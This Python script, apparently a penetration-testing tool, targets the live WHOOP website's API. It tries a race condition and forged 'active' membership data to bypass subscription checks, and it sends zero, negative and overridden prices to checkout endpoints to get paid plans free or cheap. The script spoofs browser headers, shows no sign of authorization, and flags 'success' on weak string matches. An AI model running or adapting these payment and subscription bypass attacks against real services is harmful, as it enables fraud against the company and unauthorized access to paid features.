#!/usr/bin/env python3

import requests
import json
import time
from urllib.parse import urljoin
import uuid

class SubscriptionTester:
    def __init__(self):
        self.base_url = "https://www.whoop.com"
        self.api_url = "https://www.whoop.com/api"
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Referer': 'https://www.whoop.com/',
            'Origin': 'https://www.whoop.com'
        })

    def test_subscription_bypass(self):
        """Test subscription bypass scenarios with actual impact"""
        endpoints = [
            '/api/subscription/status',
            '/api/subscription/validate',
            '/api/membership/status',
            '/api/membership/validate'
        ]

        test_cases = [
            {
                'description': 'Race condition on subscription validation',
                'requests': [
                    {
                        'method': 'POST',
                        'endpoint': '/api/subscription/validate',
                        'data': {
                            'membershipId': str(uuid.uuid4()),
                            'timestamp': int(time.time() * 1000)
                        }
                    },
                    {
                        'method': 'GET',
                        'endpoint': '/api/subscription/status'
                    }
                ],
                'delay': 0.1
            },
            {
                'description': 'Membership status manipulation',
                'requests': [
                    {
                        'method': 'GET',
                        'endpoint': '/api/membership/status'
                    },
                    {
                        'method': 'POST',
                        'endpoint': '/api/membership/validate',
                        'data': {
                            'status': 'active',
                            'validUntil': int(time.time() * 1000) + 86400000  # 24 hours from now
                        }
                    }
                ]
            }
        ]

        for test in test_cases:
            try:
                responses = []
                for req in test['requests']:
                    resp = self.session.request(
                        req['method'],
                        urljoin(self.base_url, req['endpoint']),
                        json=req.get('data', {}),
                        allow_redirects=False
                    )
                    responses.append(resp)
                    if 'delay' in test:
                        time.sleep(test['delay'])

                # Check for successful bypass
                if any(r.status_code in [200, 302] and self._indicates_success(r.text) for r in responses):
                    self.results.append({
                        'type': 'subscription_bypass',
                        'test_case': test['description'],
                        'severity': 'High',
                        'details': 'Potential subscription validation bypass',
                        'proof': [self._sanitize_response(r.text) for r in responses if r.text]
                    })
            except Exception as e:
                print(f"Error in {test['description']}: {str(e)}")

    def test_payment_manipulation(self):
        """Test payment manipulation scenarios with Next.js API structure"""
        test_cases = [
            {
                'description': 'Zero amount purchase attempt',
                'endpoint': '/api/checkout/create-session',
                'data': {
                    'planId': 'CORE_MEMBERSHIP',
                    'amount': 0,
                    'currency': 'USD',
                    'interval': 'month'
                }
            },
            {
                'description': 'Negative amount purchase attempt',
                'endpoint': '/api/checkout/create-session',
                'data': {
                    'planId': 'CORE_MEMBERSHIP',
                    'amount': -30,
                    'currency': 'USD',
                    'interval': 'month'
                }
            },
            {
                'description': 'Plan price manipulation',
                'endpoint': '/api/checkout/confirm',
                'data': {
                    'sessionId': str(uuid.uuid4()),
                    'planId': 'CORE_MEMBERSHIP',
                    'priceOverride': {
                        'amount': 1,
                        'currency': 'USD'
                    }
                }
            }
        ]

        for test in test_cases:
            try:
                resp = self.session.post(
                    urljoin(self.base_url, test['endpoint']),
                    json=test['data'],
                    allow_redirects=False
                )
                
                if resp.status_code in [200, 302] and self._indicates_success(resp.text):
                    self.results.append({
                        'type': 'payment_manipulation',
                        'test_case': test['description'],
                        'severity': 'Critical',
                        'details': 'Potential payment validation bypass',
                        'proof': self._sanitize_response(resp.text)
                    })
            except Exception as e:
                print(f"Error in {test['description']}: {str(e)}")

    def _indicates_success(self, response):
        """Check if response indicates successful transaction"""
        if not response:
            return False
            
        success_indicators = [
            '"status":"success"',
            '"status":"active"',
            '"isValid":true',
            '"sessionId"',
            '"checkoutUrl"',
            '"subscription":'
        ]
        return any(indicator in response.lower() for indicator in success_indicators)

    def _sanitize_response(self, response):
        """Remove sensitive data from response before logging"""
        try:
            data = json.loads(response)
            # Remove sensitive fields but keep structure
            for key in data.keys():
                if isinstance(data[key], str) and len(data[key]) > 20:
                    data[key] = f"{data[key][:10]}..."
            return json.dumps(data)
        except:
            return response[:100] + "..."

    def run_tests(self):
        """Run all subscription and payment tests"""
        print("Testing subscription bypass scenarios...")
        self.test_subscription_bypass()
        
        print("Testing payment manipulation scenarios...")
        self.test_payment_manipulation()
        
        return self.results

def main():
    tester = SubscriptionTester()
    results = tester.run_tests()
    
    with open('vulnerabilities/subscription_findings.json', 'w') as f:
        json.dump(results, f, indent=4)
    
    print("\nTesting completed. Results saved to subscription_findings.json")
    if results:
        print(f"\nFound {len(results)} potential issues:")
        for result in results:
            print(f"- {result['type']} ({result['severity']}): {result['details']}")

if __name__ == '__main__':
    main() 